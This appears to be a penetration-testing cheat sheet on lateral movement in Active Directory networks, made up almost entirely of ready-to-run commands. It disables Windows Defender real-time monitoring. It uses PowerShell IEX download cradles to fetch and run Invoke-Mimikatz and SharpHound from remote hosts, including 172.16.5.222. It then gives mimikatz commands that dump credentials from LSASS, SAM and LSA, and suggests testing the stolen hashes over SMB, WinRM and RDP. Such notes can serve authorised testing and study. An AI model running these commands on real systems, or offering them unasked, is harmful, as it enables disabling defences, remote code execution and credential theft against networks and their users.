# Lateral Movement Methodology

### 1) Credentials Dumping and Testing

If we get System/Admin level privileges on the machine, we can dump credentials from the machine to use them for lateral movement on other machines within a network.

This applies mostly to AD networks.

1) Disable Antivirus

        Set-MpPreference -DisableRealtimeMonitoring $True

2) Download mimikatz to target machine. You can use either the Invoke-Mimikatz powershell module, or the executable.

Execute a file in memory using powershell

      IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')

Download executable

      "IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"	

3) Run mimikatz

        .\mimikatz.exe

        privilege::debug

4) Dump LSASS

        sekurlsa::logonpasswords

5) Dump SAM

        lsadump::sam

6) Dump LSA

        lsadump::lsa

7) Collect cleartext/ntlm credentials and test them on different machines in the network using different protocols like smb, winrm and rdp for example using netexec
